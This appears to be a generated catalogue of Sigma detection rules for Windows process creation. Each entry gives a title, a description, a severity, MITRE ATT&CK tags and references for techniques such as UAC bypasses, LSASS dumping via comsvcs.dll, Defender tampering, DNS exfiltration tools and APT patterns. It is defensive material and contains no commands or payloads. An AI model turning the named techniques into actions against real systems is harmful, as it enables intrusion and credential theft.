    Detect VBoxDrvInst.exe run with parameters allowing processing INF file. This allows to create values in the registry and install drivers. For example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_vboxdrvinst.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/VBoxDrvInst.yml

* https://twitter.com/pabraeken/status/993497996179492864

    
### Suspicious WMI Reconnaissance
    
    An adversary might use WMI to list Processes running on the compromised host or list installed Software hotfix and patches.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_wmic_reconnaissance.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic

    
### Suspicious Where Execution
    
    Adversaries may enumerate browser bookmarks to learn more about compromised hosts.
Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about
internal network resources such as servers, tools/dashboards, or other related infrastructure.


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1217
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_where_execution.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md

    
### Using SettingSyncHost.exe as LOLBin
    
    Detects using SettingSyncHost.exe to run hijacked binary

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.008
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_using_settingsynchost_as_lolbin.yml
* https://www.hexacorn.com/blog/2020/02/02/settingsynchost-exe-as-a-lolbin

    
### Bloodhound and Sharphound Hack Tool
    
    Detects command line parameters used by Bloodhound and Sharphound hack tools

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1087.001
    * MITRE: attack.t1087.002
    * MITRE: attack.t1482
    * MITRE: attack.t1069.001
    * MITRE: attack.t1069.002
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_bloodhound.yml
* https://github.com/BloodHoundAD/BloodHound

* https://github.com/BloodHoundAD/SharpHound

    
### Suspicious Key Manager Access
    
    Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager)

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1555.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_keymgr.yml
* https://twitter.com/NinjaParanoid/status/1516442028963659777

    
### Webshell Detection With Command Line Keywords
    
    Detects certain command line parameters often used during reconnaissance activity via web shells

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    * MITRE: attack.t1018
    * MITRE: attack.t1033
    * MITRE: attack.t1087
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_webshell_detection.yml
* https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html

* https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/

    
### Tap Installer Execution
    
    Well-known TAP software installation. Possible preparation for data exfiltration using tunneling techniques

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_tap_installer_execution.yml
    
### Suspicious Rundll32 Activity
    
    Detects suspicious process related to rundll32 based on arguments

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_activity.yml
* http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/

* https://twitter.com/Hexacorn/status/885258886428725250

* https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52

* https://twitter.com/nas_bench/status/1433344116071583746

    
### Suspicious Auditpol Usage
    
    Threat actors can use auditpol binary to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sus_auditpol_usage.yml
* https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/

    
### Hydra Password Guessing Hack Tool
    
    Detects command line parameters used by Hydra password guessing hack tool

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1110
    * MITRE: attack.t1110.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_hydra.yml
* https://github.com/vanhauser-thc/thc-hydra

* https://attack.mitre.org/techniques/T1110/001/

    
### Hermetic Wiper TG Process Patterns
    
    This rule detects process execution patterns found in intrusions related to the Hermetic Wiper malware attacks against Ukraine in February 2022

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mal_hermetic_wiper_activity.yml
* https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia

    
### Process Dump via RdrLeakDiag.exe
    
    Detects a process memory dump performed by RdrLeakDiag.exe

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_process_dump_rdrleakdiag.yml
* https://www.pureid.io/dumping-abusing-windows-credentials-part-1/

    
### UAC Bypass Using Disk Cleanup
    
    Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_cleanmgr.yml
* https://github.com/hfiref0x/UACME

    
### Turla Group Lateral Movement
    
    Detects automated lateral movement by Turla group

    * Level: critical
    * MITRE: attack.g0010
    * MITRE: attack.execution
    * MITRE: attack.t1059
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.discovery
    * MITRE: attack.t1083
    * MITRE: attack.t1135
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_turla_commands_critical.yml
* https://securelist.com/the-epic-turla-operation/65545/

    
### Password Provided In Command Line Of Net.exe
    
    Detects a when net.exe is called with a password in the command line

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_net_use_password_plaintext.yml
* Internal Research

    
### Run Once Task Execution as Configured in Registry
    
    This rule detects the execution of Run Once task as configured in the registry

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_runonce_execution.yml
* https://twitter.com/pabraeken/status/990717080805789697

* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runonce.yml

    
### Sysinternals SDelete Delete File
    
    Use of SDelete to erase a file not the free space

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1485
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sdelete.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md

    
### Suspicious Commandline Escape
    
    Detects suspicious process that use escape characters

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1140
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_cli_escape.yml
* https://twitter.com/vysecurity/status/885545634958385153

* https://twitter.com/Hexacorn/status/885553465417756673

* https://twitter.com/Hexacorn/status/885570278637678592

* https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html

* http://www.windowsinspired.com/understanding-the-command-line-string-and-arguments-received-by-a-windows-program/

    
### Suspicious Conhost Legacy Option
    
    ForceV1 asks for information directly from the kernel space. Conhost connects to the console application

    * Level: informational
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_conhost_option.yml
* https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29

* https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/

* None

    
### Exchange Exploitation Activity
    
    Detects activity observed by different researchers to be HAFNIUM group activity (or related) on Exchange servers

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1546
    * MITRE: attack.t1053
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_hafnium.yml
* https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/

* https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

* https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3

* https://twitter.com/GadixCRK/status/1369313704869834753?s=20

* https://twitter.com/BleepinComputer/status/1372218235949617161

    
### Suspicious WMI Execution Using Rundll32
    
    Detects WMI executing rundll32

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_wmic_proc_create_rundll32.yml
* https://thedfirreport.com/2020/10/08/ryuks-return/

    
### Bypass UAC via CMSTP
    
    Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1548.002
    * MITRE: attack.t1218.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_cmstp.yml
* https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/T1191.md

* https://lolbas-project.github.io/lolbas/Binaries/Cmstp/

    
### Suspicious Recursif Takeown
    
    Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1222.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_takeown.yml
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.001/T1222.001.md#atomic-test-1---take-ownership-using-takeown-utility

    
### Execution of Renamed PaExec
    
    Detects execution of renamed paexec via imphash and executable product string

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    * MITRE: attack.g0046
    * MITRE: car.2013-05-009
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_renamed_paexec.yml
* sha256=01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc

* https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf

    
### Application Whitelisting Bypass via Dxcap.exe
    
    Detects execution of of Dxcap.exe

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_dxcap.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dxcap.yml

* https://twitter.com/harr0ey/status/992008180904419328

    
### DTRACK Process Creation
    
    Detects specific process parameters as seen in DTRACK infections

    * Level: critical
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_dtrack.yml
* https://securelist.com/my-name-is-dtrack/93338/

* https://app.any.run/tasks/4bc9860d-ab51-4077-9e09-59ad346b92fd/

* https://app.any.run/tasks/ce4deab5-3263-494f-93e3-afb2b9d79f14/

    
### DNS Exfiltration and Tunneling Tools Execution
    
    Well-known DNS Exfiltration tools execution

    * Level: high
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.001
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    * MITRE: attack.t1132.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_dns_exfiltration_tools_execution.yml
    
### Suspicious Rundll32 Invoking Inline VBScript
    
    Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_inline_vbs.yml
* https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/

    
### Mouse Lock Credential Gathering
    
    In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool "Mouse Lock" as being used for both credential access and collection in security incidents.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.collection
    * MITRE: attack.t1056.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mouse_lock.yml
* https://github.com/klsecservices/Publications/blob/master/Incident-Response-Analyst-Report-2020.pdf

* https://sourceforge.net/projects/mouselock/

    
### Abused Debug Privilege by Arbitrary Parent Processes
    
    Detection of unusual child processes by different system processes

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_abusing_debug_privilege.yml
* https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-74-638.jpg

    
### Suspicious Subsystem for Linux Bash Execution
    
    Performs execution of specified file, can be used as a defensive evasion.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lobas_bash.yml
* https://lolbas-project.github.io/lolbas/Binaries/Bash/

    
### Suspicious aspnet_compiler.exe Execution
    
    Execute C# code with the Build Provider and proper folder structure in place.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1127
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lobas_aspnet_compiler.yml
* https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/

    
### Malicious Base64 Encoded PowerShell Keywords in Command Lines
    
    Detects base64 encoded strings used in hidden malicious PowerShell command lines

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_hidden_b64_cmd.yml
* http://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/

    
### Sdclt Child Processes
    
    A General detection for sdclt spawning new processes. This could be an indicator of sdclt being used for bypass UAC techniques.

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sdclt_child_process.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/6

* https://threathunterplaybook.com/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.html

    
### Suspicious SYSVOL Domain Group Policy Access
    
    Detects Access to Domain Group Policies stored in SYSVOL

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_sysvol_access.yml
* https://adsecurity.org/?p=2288

* https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100

    
### Enabling RDP Service via Reg.exe
    
    Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.001
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_reg_enable_rdp.yml
* https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/

    
### Elise Backdoor
    
    Detects Elise backdoor acitivty as used by APT32

    * Level: critical
    * MITRE: attack.g0030
    * MITRE: attack.g0050
    * MITRE: attack.s0081
    * MITRE: attack.execution
    * MITRE: attack.t1059.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_elise.yml
* https://community.rsa.com/community/products/netwitness/blog/2018/02/13/lotus-blossom-continues-asean-targeting

    
### UAC Bypass Using MSConfig Token Modification - Process
    
    Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_msconfig_gui.yml
* https://github.com/hfiref0x/UACME

    
### PsExec Service Start
    
    Detects a PsExec service start

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.s0029
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_psexesvc_start.yml
    
### Regsvr32 Command Line Without DLL
    
    Detects a regsvr.exe execution that doesn't contain a DLL in the command line

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_regsvr32_no_dll.yml
* https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/

    
### Suspicious Atbroker Execution
    
    Atbroker executing non-deafualt Assistive Technology applications

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_atbroker.yml
* http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/

* https://lolbas-project.github.io/lolbas/Binaries/Atbroker/

    
### Process Dump via Rundll32 and Comsvcs.dll
    
    Detects a process memory dump performed via ordinal function 24 in comsvcs.dll

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.credential_access
    * MITRE: car.2013-05-009
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_process_dump_rundll32_comsvcs.yml
* https://twitter.com/shantanukhande/status/1229348874298388484

* https://twitter.com/pythonresponder/status/1385064506049630211?s=21

* https://twitter.com/Hexacorn/status/1224848930795552769

    
### DLL Execution Via Register-cimprovider.exe
    
    Detects using register-cimprovider.exe to execute arbitrary dll file.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_register_cimprovider.yml
* https://twitter.com/PhilipTsukerman/status/992021361106268161

* https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Register-cimprovider.md

    
### Suspicious Execution of SharpView Aka PowerView
    
    Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1049
    * MITRE: attack.t1069.002
    * MITRE: attack.t1482
    * MITRE: attack.t1135
    * MITRE: attack.t1033
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_sharpview.yml
* https://github.com/tevora-threat/SharpView/

* https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-4---system-discovery-using-sharpview

    
### Suspicious Serv-U Process Pattern
    
    Detects a suspicious process pattern which could be a sign of an exploited Serv-U service

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1555
    * MITRE: cve.2021.35211
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_servu_process_pattern.yml
* https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/

    
### Suspicious WebDav Client Execution
    
    Detects a privilege elevation attempt by coercing NTLM authentication on the Printer Spooler service

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.credential_access
    * MITRE: attack.t1212
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ntlmrelay.yml
* https://twitter.com/med0x2e/status/1520402518685200384

* https://github.com/elastic/detection-rules/blob/dd224fb3f81d0b4bf8593c5f02a029d647ba2b2d/rules/windows/credential_access_relay_ntlm_auth_via_http_spoolss.toml

    
### Powershell Defender Base64 MpPreference
    
    Detects base64 encoded PowerShell code that modifies Windows Defender

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_defender_base64.yml
* https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-test

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

* https://twitter.com/AdamTheAnalyst/status/1483497517119590403

    
### Suspicious Execution of Powershell with Base64
    
    Commandline to lauch powershell with a base64 payload

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_encode.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets

* https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/

* https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/

    
### Equation Group DLL_U Load
    
    Detects a specific tool and export used by EquationGroup

    * Level: critical
    * MITRE: attack.g0020
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_equationgroup_dll_u_load.yml
* https://github.com/adamcaudill/EquationGroupLeak/search?utf8=%E2%9C%93&q=dll_u&type=

* https://securelist.com/apt-slingshot/84312/

* https://twitter.com/cyb3rops/status/972186477512839170

    
### Non Interactive PowerShell
    
    Detects non-interactive PowerShell activity by looking at powershell.exe with not explorer.exe as a parent.

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_non_interactive_powershell.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html

    
### Pandemic Registry Key
    
    Detects Pandemic Windows Implant

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_pandemic.yml
* https://wikileaks.org/vault7/#Pandemic

* https://twitter.com/MalwareJake/status/870349480356454401

    
### Run Whoami as Privileged User
    
    Detects a whoami.exe executed by privileged accounts that are often misused by threat actors

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_whoami_as_priv_user.yml
* https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment

* https://nsudo.m2team.org/en-us/

    
### Execution via stordiag.exe
    
    Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_stordiag_execution.yml
* https://strontic.github.io/xcyclopedia/library/stordiag.exe-1F08FC87C373673944F6A7E8B18CD845.html

* https://twitter.com/eral4m/status/1451112385041911809

    
### Use of LogMeIn Remote Access Software
    
    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_logmein.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-3---logmein-files-detected-test-on-windows

    
### Droppers Exploiting CVE-2017-11882
    
    Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.t1204.002
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_cve_2017_11882.yml
* https://www.hybrid-analysis.com/sample/2a4ae284c76f868fc51d3bb65da8caa6efacb707f265b25c30f34250b76b7507?environmentId=100

* https://www.google.com/url?hl=en&q=https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about&source=gmail&ust=1511481120837000&usg=AFQjCNGdL7gVwLXaNSl2Td8ylDYbSJFmPw

    
### Taskmgr as LOCAL_SYSTEM
    
    Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_taskmgr_localsystem.yml
    
### Suspicious MSHTA Process Patterns
    
    Detects suspicious mshta process patterns

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1106
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_mshta_pattern.yml
* https://en.wikipedia.org/wiki/HTML_Application

* https://www.echotrail.io/insights/search/mshta.exe

* https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/

    
### Suspicious AdvancedRun Execution
    
    Detects the execution of AdvancedRun utitlity

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_advancedrun.yml
* https://twitter.com/splinter_code/status/1483815103279603714

* https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3

* https://elastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/article/

* https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/

    
### Excel Proxy Executing Regsvr32 With Payload
    
    Excel called wmic to finally proxy execute regsvr32 with the payload. An attacker wanted to break suspicious parent-child chain (Office app spawns LOLBin).But we have command-line in the event which allow us to "restore" this suspicious parent-child chain and detect it. Monitor process creation with "wmic process call create" and LOLBins in command-line with parent Office application processes.

    * Level: high
    * MITRE: attack.t1204.002
    * MITRE: attack.t1047
    * MITRE: attack.t1218.010
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_office_from_proxy_executing_regsvr32_payload2.yml
* https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/

* https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml

    
### Psr.exe Capture Screenshots
    
    The psr.exe captures desktop screenshots and saves them on the local machine

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1113
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_psr_capture_screenshots.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Psr.yml

* https://www.sans.org/summit-archives/file/summit-archive-1493861893.pdf

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md

    
### Modification of Boot Configuration
    
    Identifies use of the bcdedit command to delete boot configuration data. This tactic is sometimes used as by malware or an attacker as a destructive technique.

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_bootconf_mod.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md

* https://eqllib.readthedocs.io/en/latest/analytics/c4732632-9c1d-4980-9fa8-1d98c93f918e.html

    
### UNC2452 PowerShell Pattern
    
